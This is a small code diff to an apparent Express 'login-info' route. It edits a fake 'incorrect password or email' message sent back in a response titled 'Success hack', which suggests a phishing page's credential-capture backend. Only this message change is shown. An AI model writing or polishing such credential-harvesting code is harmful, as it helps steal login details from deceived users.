@@ -30,7 +30,7 @@ app.post('/login-info', (req, res) => {
 
         res.json({
             title: "Success hack",
-            message: "Sorry, incorrect password or email address."
+            message: "Sorry, incorrect password or email"
         })
     } catch (e) {
         res.json({
